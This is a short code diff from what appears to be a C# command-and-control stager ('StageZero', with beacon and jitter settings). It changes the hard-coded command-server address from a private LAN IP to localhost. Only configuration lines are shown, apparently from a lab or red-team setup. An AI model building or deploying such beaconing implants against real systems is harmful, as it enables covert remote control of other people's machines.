@@ -41,7 +41,7 @@ namespace Stager
         public StageZero(int beacon, int jitter)
         {
             commandUriList = new List<Uri>();
-            commandUriList.Add(new Uri("http://192.168.1.194"));
+            commandUriList.Add(new Uri("http://localhost:8080"));
             this.beacon = beacon;
             this.jitter = jitter;
             System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11;
